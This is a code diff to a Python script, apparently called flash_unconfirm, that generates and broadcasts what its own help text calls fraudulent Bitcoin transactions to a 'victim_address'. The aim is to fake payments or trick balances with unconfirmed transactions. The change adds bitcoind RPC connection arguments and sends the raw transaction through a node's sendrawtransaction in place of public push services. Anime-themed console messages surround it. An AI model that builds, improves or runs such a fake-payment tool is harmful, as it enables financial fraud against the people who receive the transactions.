@@ -11,6 +11,19 @@ import bitcoin.rpc
 from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To Use flash_unconfirm")
+
+parser.add_argument("node_host",
+                    help="your bitcoind node host name",
+                    type=str)
+parser.add_argument("node_port",
+                    help="your bitcoind node host port",
+                    type=int)
+parser.add_argument("node_user",
+                    help="your bitcoind node user name",
+                    type=str)
+parser.add_argument("node_password",
+                    help="your bitcoind node password",
+                    type=str)
 parser.add_argument("send_from_wifkey",
                     help="Fake send btc from wif key.",
                     type=str)
@@ -30,6 +43,7 @@ parser.add_argument("--loop_count",
                     help="How many fraudulent transactions to submit? If the balance is low, it may be possible to deceive the balance by sending it multiple times. (Default is 1.)",
                     default=1,
                     type=int)
+
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return round(btc_amount / satoshi)
@@ -66,6 +80,11 @@ def broadcast_transaction(raw_tx, testnet):
 
 
 args = parser.parse_args()
+node_host        = args.node_host
+node_port        = args.node_port
+node_user        = args.node_user
+node_password    = args.node_password
+
 fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
 amount_btc = args.amount_of_coins
@@ -76,6 +95,12 @@ if loop_count <= 0:
     loop_count = 1
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
+print("Connecting node.")
+rpc_node = bitcoin.rpc.Proxy(f"http://{node_user}:{node_password}@{node_host}:{node_port}",
+                             service_port=node_port)
+
+print(rpc_node.getinfo())
+
 balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
 inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
     #balance = transaction_util.get_balance(send_from)
@@ -84,7 +109,6 @@ if balance["confirmed"] <= 0:
 else:
     balance = balance["confirmed"]
 
-fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
 
 send_amount = to_satoshi(amount_btc)
 
@@ -129,14 +153,8 @@ for i  in range(loop_count):
     print()
     print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
     print()
-    print("GEN SND PRNT ITX (不正なトランザクションを生成、送信 表示!)")
-    if testnet:
-        broadcast_transaction(tx_victim, testnet)
-    else:
-        try:
-            transaction_util.pushtx(tx_victim)
-        except:
-            broadcast_transaction(tx_victim, testnet)
+    print("SND PRNT ITX (不正なトランザクションを 表示送信 !)")
+    rpc_node.sendrawtransaction(tx_victim)
     print(tx_victim)
     print()
     #ゴリ押し
@@ -144,7 +162,7 @@ for i  in range(loop_count):
     #おまけ
     print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
     print()
-    print("What if you send the generated transaction using https://live.blockcypher.com/btc/pushtx/??")
+    #print("What if you send the generated transaction using https://live.blockcypher.com/btc/pushtx/??")
     sound_name = "ImagineBreaker.mp3"
     try:
         import soundplay
